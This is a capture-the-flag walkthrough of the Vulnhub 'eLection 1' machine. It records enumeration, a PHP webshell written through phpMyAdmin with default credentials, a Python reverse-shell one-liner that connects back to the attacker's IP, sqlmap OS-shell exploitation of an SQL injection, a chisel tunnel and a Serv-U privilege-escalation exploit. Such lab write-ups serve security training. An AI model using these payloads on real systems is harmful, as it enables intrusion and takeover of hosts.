---
title: eLection 1
categories: [Vulnhub, Linux]
date: 2022-02-15 
tags: [exploit/sqli/rce, linux-priv-esc/linux-creds-found, tcp/80-http/web-app-cms-exploit]
img_path: /Writeups/Vulnhub/Linux/eLection 1/images/
image:
  src: Pasted%20image%2020220215005113.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Recon

## TCP/80 (HTTP)
### FFUF - common.txt
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
â””â”€# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.29/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
phpinfo.php             [Status: 200, Size: 95531, Words: 4724, Lines: 1170]
phpinfo.php             [Status: 200, Size: 95531, Words: 4724, Lines: 1170]
robots.txt              [Status: 200, Size: 30, Words: 1, Lines: 5]
robots.txt              [Status: 200, Size: 30, Words: 1, Lines: 5]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- `javascript`
- `phpmyadmin`
- `phpinfo.php`
- `robots.txt`

### FFUF - directory-list-2.3-medium.txt
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
â””â”€# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.29/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 30, Words: 1, Lines: 5]
election                [Status: 301, Size: 319, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
phpinfo.php             [Status: 200, Size: 95531, Words: 4724, Lines: 1170]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [882184/882184] :: Job [1/1] :: 9187 req/sec :: Duration: [0:02:18] :: Errors: 0 ::
```
- `election`


# Initial Foothold

## TCP/80 (HTTP) - Weak Credentials + Insert Webshell at phpMyAdmin
1. View enumerated directories
	- `javascript`
		- 403 Forbidden
	- `phpmyadmin`
		![](Pasted%20image%2020220214231408.png)
	- `robots.txt`
		```
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
		â””â”€# curl 192.168.110.29/robots.txt
		admin
		wordpress
		user
		election
		```
	- `election`
		![](Pasted%20image%2020220214231131.png)
		- No vulnerabilities found
2. Proceed to `phpmyadmin`, login w/ default credentials (root:toor)
	![](Pasted%20image%2020220214231618.png)
3. Proceed to `election -> tb_panitia`
	![](Pasted%20image%2020220214234500.png)
4. Crack `md5` hash
	- Failed to crack, exhausted `rockyou.txt`
5. Insert web shell, `Select election database -> SQL`
	``` 
	# Payload
	SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/webshell.php"
	```
	![](Pasted%20image%2020220214231818.png)
6. Execute command at `webshell.php`
	![](Pasted%20image%2020220214231927.png)
7. Obtain www-data shell
	``` 
	# Payload
	python+-c+'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
	```
	![](Pasted%20image%2020220214232813.png)
	![](Pasted%20image%2020220214232848.png)

# Initial Foothold (2) - Directory Enumeration (Log File)
1. Instead of inserting a webshell via `phpMyAdmin`, directory enumerate `election`
	``` 
	â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
	â””â”€# ffuf -u http://192.168.110.29/election/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .html,.txt,.php,.cgi,.log --recursion -of html -o election_fuzz.html -fc 403
	```
	![](Pasted%20image%2020220215013005.png)
	- `system.log`
2. View `system.log`
	![](Pasted%20image%2020220215013118.png)
	- love:`P@$$w0rd@123`
3. SSH w/  love:`P@$$w0rd@123`

# Initial Foothold (3) - SQLMap OS-SHELL
1. Login to `phpMyAdmin` w/ root:toor
2. Crack the hash w/ an [online tool](https://hashes.com/en/decrypt/hash)
	![](Pasted%20image%2020220215014047.png)
	- 1234:`Zxc123!@#`
3. Proceed to `/election/admin` & login w/  `1234:Zxc123!@#`
	![](Pasted%20image%2020220215014733.png)
4. Search for exploits for `election`

	| Exploit Title                     | Path                  |
	| --------------------------------- | --------------------- |
	| eLection 2.0 - 'id' SQL Injection | php/webapps/48122.txt |

5. Try `php/webapps/48122.txt` 
	1. Login
	2. Proceed to Candidates
	3. Intercept w/ burp, edit request according to `php/webapps/48122.txt`
		![](Pasted%20image%2020220215021139.png)
		![](Pasted%20image%2020220215015906.png)
		- `Right-Click -> Save item -> sqli.txt`
	4. Use SQLMap to insert shell, allowing us to do RCE
		``` 
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1/192.168.110.29/exploit]
		â””â”€# sqlmap -r sqli.txt --level=5 --risk=3 --os-shell -p id
		```
		![](vmware_q5a8vXeBfQ.gif)
1. Download [`php-reverse-shell.php`](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) onto target
	![](Pasted%20image%2020220215020246.png)
7. Obtain www-data shell
	``` 
	â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
	â””â”€# curl http://192.168.110.29/php-reverse-shell.php
	```
	![](vmware_kII93Vlmd4.gif)
	
# Privilege Escalation

## Love - Via Creds Found
1. View files in `/var/www/html`, look for files that could contain credentials
	``` 
	www-data@election:/var/www/html$ find $(pwd)
	...
	/var/www/html/election/admin/logs
	/var/www/html/election/admin/logs/system.log
	...
	```
2. View `system.log`
	``` 
	www-data@election:/var/www/html/election/admin/logs$ cat system.log 
	[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
	[2020-04-03 00:13:53] Love added candidate 'Love'.
	[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
	[2022-02-14 21:39:13] Love has been logged in from Unknown IP on Chrome (Linux).
	www-data@election:/var/www/html/election/admin/logs$ 
	```
	- love:`P@$$w0rd@123`
3. Switch to love w/  love:`P@$$w0rd@123`
	![](Pasted%20image%2020220215001501.png)
4. User Flag
	``` 
	love@election:~$ cat /home/love/Desktop/user.txt
	cd38ac698c0d793a5236d01003f692b0
	love@election:~$ 
	```

## Root - Via Serv-U < 15.1.7 Exploit
1. Ran linpeas again
	![](Pasted%20image%2020220215004322.png)
	- `TCP/43958`
2. Open up the internal service (`TCP/43958`) w/ chisel
	- Kali
		``` 
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/eLection-1]
		â””â”€# chisel server --reverse --port 1337
		```
	- Target
		``` 
		love@election:/tmp$ ./chiselLinux64 client 192.168.110.4:1337 R:8888:127.0.0.1:43958 &
		```
3. Proceed to `localhost:8888`	
	![](Pasted%20image%2020220215004638.png)
	- `Serv-U 15.1.6.25`
4. Search exploits for `Serv-U 15.1.6.25`

	| Exploit Title                                               | Path                    |
	| ----------------------------------------------------------- | ----------------------- |
	| Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1) | linux/local/47009.c     |
	| Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2) | multiple/local/47173.sh |

5. Try `multiple/local/47173.sh`
	``` 
	love@election:/tmp$ chmod +x 47173.sh 
	love@election:/tmp$ ./47173.sh 
	```
	![](Pasted%20image%2020220215004816.png)
6. Root Flag
	``` 
	sh-4.4# cd /root
	sh-4.4# ls
	root.txt
	sh-4.4# cat root.txt 
	5238feefc4ffe09645d97e9ee49bc3a6
	sh-4.4# 
	```


